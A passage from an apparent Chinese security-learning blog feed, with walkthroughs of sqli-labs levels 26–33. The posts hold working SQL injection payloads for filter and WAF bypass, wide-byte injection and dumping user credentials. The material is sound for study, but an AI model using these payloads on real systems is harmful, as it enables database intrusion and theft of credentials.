invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out slashes</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以看到，这一次，不仅仅是or与and，还多过滤了好几种情况<br>我们只需要绕过即可，对于空格有几种方式：</li>
</ol>
<ul>
<li>编码绕过<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 TAB键（空格）  %0A 新建一行（空格）</span><br><span class="line">%0C 新的一页       %0D return即回车功能（php-5.2.17,5.3.29成功）</span><br><span class="line">%0B TAB键（垂直）  %A0 空格（php-5.2.17成功）</span><br></pre></td></tr></table></figure></li>
<li>括号绕过<br>用()绕过，不使用任何空格</li>
<li>以上方法不一定都对自己的配置有效，需要尝试</li>
</ul>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><p>这里使用()的方式绕过空格</p>
<ol start="2">
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(concat(&#x27;~&#x27;,id,&#x27;~&#x27;,username,&#x27;~&#x27;,passwoorrd))from(users)limit%0b0,1)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>这里使用%0b的方式绕过空格，%26%26绕过and</p>
<ol start="2">
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;%0bunion%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=&#x27;%0bunion%0bselect%0b1,version(),3%26%26&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=&#x27;security&#x27;%0baandnd%0btable_name=&#x27;users&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第26a关"><a href="#第26a关" class="headerlink" title="第26a关"></a>第26a关</h2><p>与26关相比，只是闭合方式变更为’)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>使用url编码后，逐渐让语句变得不那么好读了…</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_46315342/article/details/106557886">Sqli-labs之Less-26和Less-26a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_27+27a</title>
    <url>/2022/11/17/sqli-labs_27+27a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相比之前并没有大的变化，照猫画虎罢了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题不大，可以通过大小写或重写绕过</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第27a关"><a href="#第27a关" class="headerlink" title="第27a关"></a>第27a关</h2><p>与27关相比，只是闭合方式变更为”</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>a piece of cake~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_28</title>
    <url>/2022/11/17/sqli-labs_28+28a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过该绕过的，注入照常注入</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
绕过union和select，选择重写或加字符绕过<br>末尾选择字符串截断%00<br>或<code>%0aand(&#39;1</code></li>
</ol>
<h1 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h1><ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A4%0Aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,database(),3%0aand(&#x27;1</span><br><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,version(),3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第28a关"><a href="#第28a关" class="headerlink" title="第28a关"></a>第28a关</h2><p>与28关相比，只是过滤条件少了几个</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>构造语句的原理还不甚明白，有些人写的博客能过，有些不能过。<br>总的来说，用%00是比较通用简单的方式</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105801767">Sqli-labs之Less-28和Less-28a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_29-31</title>
    <url>/2022/11/17/sqli-labs_29-31/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又出了个新花样</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>先进行常规操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+  出现报错</span><br><span class="line">?id=-1&#x27;union select 1,2,3 --+  爆出显示位</span><br></pre></td></tr></table></figure>
<p>但当我们进入login.php页面，再继续注入时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login.php?id=1&#x27; --+</span><br></pre></td></tr></table></figure>
<p>页面跳转<br><img src="/simg/sqli-labs_29.png" alt="显示"><br>这里是部署了WAF<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>详细解释：<a href="https://baike.baidu.com/item/WAF/3239498">WAF</a><br>第一个参数被WAF所检查，但第二个参数不会，因此我们可以加入第二个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第30关"><a href="#第30关" class="headerlink" title="第30关"></a>第30关</h2><p>与第29关差不多，只是闭合方式从’变更为”</p>
<h2 id="第31关"><a href="#第31关" class="headerlink" title="第31关"></a>第31关</h2><p>与第29关差不多，只是闭合方式从”变更为”)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是，知道怎么做，注入方式就那几样，常规注入，报错注入，布尔盲注，时间盲注，抓包注入…</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_3</title>
    <url>/2022/11/08/sqli-labs_3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
<ol start="3">
<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>此笔记为笔者初学sql注入时所写</li>
<li>本关重点在于通过报错信息判断sql语句</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_32+33</title>
    <url>/2022/11/18/sqli-labs_32+33/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关涉及到了编码格式</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  发现被转义为了 1\&#x27;</span><br></pre></td></tr></table></figure>
查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
复习一下，<br>preg_replace()函数执行一个正则表达式的搜索和替换。详细：<a href="https://www.runoob.com/php/php-preg_replace.html">PHP preg_replace() 函数</a><br>preg_quote()函数用于转义正则表达式字符。详细：<a href="https://www.runoob.com/php/php-preg_quote.html">PHP preg_quote() 函数</a><br>因此，我们无法用单引号双引号闭合注入<br>但源码中还有一句引起了注意：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>
这里表明是使用gbk编码，那么我们可以尝试使用宽字节注入。</li>
</ol>
<ul>
<li>当某字符的大小为一个字节时，称其字符为窄字节.</li>
<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
<li>所有英文默认占一个字节，汉字占两个字节</li>
<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等<br>宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。<br>宽字节注入情况：</li>
<li>客户端、连接层、结果集 都是GBK编码</li>
<li>使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。</li>
<li>使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。</li>
</ul>
<p>注意：<br>页面默认是utf-8，如果想看显示效果需要更改页面编码，我这里是用到了chrome的扩展商店的插件，具体可看下面这篇文章<br><a href="https://www.munue.com/172.html#:~:text=%E5%8F%B3%E9%94%AE%E7%82%B9%E5%87%BB%E5%9B%BE%E6%A0%87%EF%BC%8C%E6%89%93%E5%BC%80%E9%80%89%E9%A1%B9,%E8%BF%9B%E8%A1%8C%E9%80%89%E6%8B%A9%E5%92%8C%E8%AE%BE%E7%BD%AE%E7%BC%96%E7%A0%81%E3%80%82">Google Chrome 浏览器如何设置网页编码</a></p>
<p>最终，我们构造该语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
<p>页面显示效果如下<br><img src="/simg/sqli-labs_32.png" alt="显示效果"></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users) --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第33关"><a href="#第33关" class="headerlink" title="第33关"></a>第33关</h2><p>和第32关本质是一样的，只是源码用了addslashes()函数<br>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串<br>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL<br>注入方式相同，这里不再重复</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学到了宽字节注入</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_34</title>
    <url>/2022/11/18/sqli-labs_34/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>gogogo</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>有两种方案：</p>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol>
